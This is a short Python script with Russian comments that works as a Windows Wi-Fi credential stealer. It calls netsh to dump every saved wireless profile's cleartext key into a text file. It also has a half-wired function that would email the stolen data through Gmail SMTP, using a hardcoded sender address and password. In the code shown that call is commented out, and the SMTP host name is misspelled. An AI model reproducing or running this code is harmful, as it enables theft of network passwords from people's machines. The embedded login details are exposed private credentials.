import subprocess
import smtplib

def send_email(message):
    sender = "zhenya.vip2001@gmail.com"
    password = "13012002"

    server = smtplib.SMTP("smpt.gmail.com", 587)
    server.starttls()

    try:
        server.login(sender, password)
        server.sendmail(sender,sender,f"Subject: CLICK ME PLEAST!\n{message}")
        return "Сообщение доставлено"

    except Exception as _ex:
        return f"{_ex}\n Проверь свой логин или пароль"

def extract_wifi_password():
    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866')\
        .split('\n')## Выполняет команду просматра профилей беспроводных сетей

    ## Конструкция list comprehension
    ## Пробегаемся по списку "profiles_data" и если в строке находится "Все профили пользователей", тогда забираем строку
    ## разбиваем по ":" и убираем пробелы слева и справа
    profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]

    for profile in profiles: ## Пробегаемся по списку профилей
        ## Достаём информацию о конкретном пользователе
        profile_info = subprocess.check_output(f'netsh wlan show profile \"{profile}\" key=clear').decode('CP866').split('\n')
        try:
            password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i][0]
        except IndexError:
            password = None

        ##Конструкция with ... as используется для оборачивания выполнения блока инструкций менеджером контекста. Иногда это более удобная конструкция, чем try...except...finally.
        with open(file='Пароли Wi-Fi.txt',mode='a', encoding='utf-8') as file: ## Права доступа ( флаг) "а" - открывает файл для добавления информации в файл
            file.write(f'Профиль: {profile}\nПароль: {password}\n{"#" * 20}\n')

def main():
    extract_wifi_password()
    #message = input("dasdasd:")
    #print(send_email(message=message))
if __name__ == '__main__':
    main()
